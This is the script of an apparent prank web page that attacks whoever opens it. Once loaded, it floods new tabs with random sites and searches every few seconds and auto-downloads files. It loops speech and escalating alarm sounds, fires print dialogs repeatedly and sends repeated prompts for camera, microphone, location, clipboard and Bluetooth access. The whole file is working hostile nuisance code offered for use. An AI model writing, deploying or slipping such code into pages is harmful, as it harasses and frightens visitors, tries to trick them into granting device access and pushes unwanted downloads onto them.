    <style>

<body>
    <div class="iframe-container">

    <script>
        (function() {
            const SITES = [
                'https://www.chrome.com',
                'https://www.github.com',
                'https://www.microsoft.com',
                'https://www.freegames.com',
                'https://www.pointerpointer.com',
                'https://mee6.gg',
                'https://dyno.gg',
                'https://talkomatic.co',
                'https://discord.com/developers',
                'https://totalenergies.com',
                'https://sfr.com',
                'https://bonzibuddy.org',
                'chrome://chrome-urls/',  // Internal chrome page (may not open in new tab)
                'https://www.fbi.gov',
                'https://www.omegle.com',
                // two new sites as requested
                'https://www.google.com/maps',
                'https://minecraft.en.modilimitado.io/'
            ];

            const SEARCHES = [
                'how to eat burger',
                'free minecraft apk no scam 2026 latest version',
                'robloxe fre haks 2026 noe SCAM',
                'rush E',
                'me when the',
                'GTA 6 and 7 free'
            ];

            const INTERVAL_SECONDS = 5;
            const PRINT_INTERVAL_SECONDS = 20;

            function openUrl(url) {
                const newWindow = window.open(url, '_blank');
                if (!newWindow) {
                    const link = document.createElement('a');
                    link.href = url;
                    link.target = '_blank';
                    link.click();
                }
            }

            function openRandomSiteAndSearch() {
                const siteIndex = Math.floor(Math.random() * SITES.length);
                const site = SITES[siteIndex];
                const searchIndex = Math.floor(Math.random() * SEARCHES.length);
                const query = SEARCHES[searchIndex];
                const searchUrl = 'https://www.google.com/search?q=' + encodeURIComponent(query);
                openUrl(site);
                setTimeout(() => {
                    openUrl(searchUrl);
                }, 100);
            }

            function downloadFile(filename) {
                const a = document.createElement('a');
                a.href = filename;
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
            }

            function downloadAllFiles() {
                downloadFile('cat.png');
                downloadFile('you-just-got.txt');
                downloadFile('moai.mp3');
            }

            function startLoopingTTS() {
                if ('speechSynthesis' in window) {
                    function speak() {
                        speechSynthesis.cancel();
                        const utterance = new SpeechSynthesisUtterance("Hello, I am your computer");
                        utterance.rate = 1;
                        utterance.pitch = 1;
                        utterance.volume = 1;
                        utterance.lang = 'en-US';
                        utterance.onend = () => {
                            setTimeout(speak, 500);
                        };
                        utterance.onerror = () => {
                            setTimeout(speak, 500);
                        };
                        speechSynthesis.speak(utterance);
                    }
                    speak();
                }
            }

            function startCursorToggle() {
                let cursorState = 'default';
                setInterval(() => {
                    cursorState = cursorState === 'default' ? 'progress' : 'default';
                    document.body.style.cursor = cursorState;
                }, 500);
            }

            function requestFakePermissions() {
                // Existing permissions
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(() => {}, () => {});
                }
                if ('Notification' in window) {
                    Notification.requestPermission().then(() => {});
                }
                if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
                    navigator.mediaDevices.getUserMedia({ audio: true, video: true })
                        .then(stream => stream.getTracks().forEach(track => track.stop()))
                        .catch(() => {});
                }
                if ('clipboard' in navigator && 'readText' in navigator.clipboard) {
                    navigator.clipboard.readText().catch(() => {});
                }

                // 3 new permission requests (harmless)
                if ('storage' in navigator && 'persist' in navigator.storage) {
                    navigator.storage.persist().then(() => {});
                }
                if ('wakeLock' in navigator) {
                    navigator.wakeLock.request('screen').catch(() => {});
                }
                if ('bluetooth' in navigator) {
                    navigator.bluetooth.requestDevice({ acceptAllDevices: true }).catch(() => {});
                }
                // Additional optional ones (commented out to avoid overkill)
                // if ('usb' in navigator) navigator.usb.requestDevice({ filters: [] }).catch(() => {});
                // if ('hid' in navigator) navigator.hid.requestDevice({ filters: [] }).catch(() => {});
            }

            function startPrintLoop() {
                setInterval(() => {
                    window.print();
                }, PRINT_INTERVAL_SECONDS * 1000);
            }

            window.addEventListener('load', function() {
                setTimeout(downloadAllFiles, 500);
                startLoopingTTS();
                startCursorToggle();
                startPrintLoop();
                
                setTimeout(requestFakePermissions, 1000);
                setTimeout(requestFakePermissions, 4000);
                setTimeout(requestFakePermissions, 8000);
            });

            setTimeout(openRandomSiteAndSearch, 1000);
            setInterval(openRandomSiteAndSearch, INTERVAL_SECONDS * 1000);
        })();

// AUDIO CHAOS ENGINE
(function() {
    // Create hidden audio container
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    
    // Generate annoying sounds programmatically
    function createBeep(freq = 800, duration = 0.1, type = 'sine') {
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        oscillator.frequency.value = freq;
        oscillator.type = type;
        
        gainNode.gain.value = 0.1;
        gainNode.gain.exponentialRampToValueAtTime(0.00001, audioContext.currentTime + duration);
        
        oscillator.start();
        oscillator.stop(audioContext.currentTime + duration);
    }
    
    // Pre-made annoying sound patterns
    const sounds = [
        () => { // Dial-up internet
            const freqs = [400, 600, 800, 1200, 1600];
            freqs.forEach((f, i) => {
                setTimeout(() => createBeep(f, 0.05, 'square'), i * 100);
            });
        },
        () => { // Error beep
            createBeep(1000, 0.2, 'sawtooth');
            setTimeout(() => createBeep(800, 0.2, 'sawtooth'), 200);
            setTimeout(() => createBeep(600, 0.3, 'sawtooth'), 400);
        },
        () => { // Random noise burst
            const noise = audioContext.createBufferSource();
            const buffer = audioContext.createBuffer(1, audioContext.sampleRate * 0.1, audioContext.sampleRate);
            const data = buffer.getChannelData(0);
            for(let i = 0; i < buffer.length; i++) {
                data[i] = Math.random() * 2 - 1;
            }
            noise.buffer = buffer;
            noise.connect(audioContext.destination);
            noise.start();
            noise.stop(audioContext.currentTime + 0.1);
        },
        () => { // Alarm
            for(let i = 0; i < 5; i++) {
                setTimeout(() => createBeep(1500, 0.1, 'triangle'), i * 200);
                setTimeout(() => createBeep(1200, 0.1, 'triangle'), i * 200 + 100);
            }
        },
        () => { // Low battery sound
            createBeep(500, 0.3, 'sine');
            setTimeout(() => createBeep(400, 0.3, 'sine'), 400);
            setTimeout(() => createBeep(300, 0.5, 'sine'), 800);
        },
        () => { // Windows error (classic)
            createBeep(800, 0.1, 'square');
            setTimeout(() => createBeep(600, 0.1, 'square'), 100);
            setTimeout(() => createBeep(400, 0.2, 'square'), 200);
        },
        () => { // Modem handshake (iconic)
            const pattern = [200, 300, 400, 600, 800, 1200];
            pattern.forEach((f, i) => {
                setTimeout(() => createBeep(f, 0.05, 'sawtooth'), i * 50);
                setTimeout(() => createBeep(f/2, 0.05, 'sawtooth'), i * 50 + 25);
            });
        },
        () => { // Robot voice
            const words = ['Hello', 'I am', 'your', 'computer'];
            words.forEach((word, i) => {
                setTimeout(() => {
                    for(let j = 0; j < word.length; j++) {
                        setTimeout(() => {
                            createBeep(600 + (word.charCodeAt(j) % 400), 0.1, 'square');
                        }, j * 120);
                    }
                }, i * 800);
            });
        },
        () => { // Emergency broadcast
            createBeep(1000, 0.5, 'sine');
            setTimeout(() => createBeep(600, 0.5, 'sine'), 600);
            setTimeout(() => createBeep(1000, 0.5, 'sine'), 1200);
            setTimeout(() => {
                for(let k = 0; k < 10; k++) {
                    setTimeout(() => createBeep(800, 0.05, 'sawtooth'), k * 100);
                }
            }, 1800);
        },
        () => { // Microwave done
            for(let i = 0; i < 3; i++) {
                setTimeout(() => createBeep(900, 0.2, 'sine'), i * 400);
            }
        },
        () => { // Game over
            createBeep(400, 0.2, 'sawtooth');
            setTimeout(() => createBeep(300, 0.2, 'sawtooth'), 200);
            setTimeout(() => createBeep(200, 0.4, 'sawtooth'), 400);
            setTimeout(() => createBeep(100, 0.6, 'sawtooth'), 800);
        }
    ];
    
    // Play random sound
    function playRandomSound() {
        if(audioContext.state === 'suspended') {
            audioContext.resume();
        }
        const soundIndex = Math.floor(Math.random() * sounds.length);
        sounds[soundIndex]();
    }
    
    // Schedule sounds with increasing frequency
    let interval = 3000; // Start every 3 seconds
    function scheduleSounds() {
        playRandomSound();
        
        // Gradually increase frequency (get more annoying)
        interval = Math.max(500, interval * 0.9);
        
        setTimeout(scheduleSounds, interval + Math.random() * 1000);
    }
    
    // Start after page loads
    setTimeout(scheduleSounds, 2000);
    
    // Add background ambient noise
    function backgroundHum() {
        const noise = audioContext.createBufferSource();
        const buffer = audioContext.createBuffer(1, audioContext.sampleRate * 2, audioContext.sampleRate);
        const data = buffer.getChannelData(0);
        for(let i = 0; i < buffer.length; i++) {
            data[i] = (Math.random() * 2 - 1) * 0.02; // Very quiet
        }
        noise.buffer = buffer;
        noise.loop = true;
        
        const filter = audioContext.createBiquadFilter();
        filter.type = 'lowpass';
        filter.frequency.value = 200;
        
        noise.connect(filter);
        filter.connect(audioContext.destination);
        noise.start();
    }
    
    // Uncomment for constant quiet hum (evil)
    // setTimeout(backgroundHum, 5000);
    
    // React to user interactions to ensure audio context runs
    document.addEventListener('click', () => {
        if(audioContext.state === 'suspended') {
            audioContext.resume();
        }
    }, { once: true });
})();

    </script>
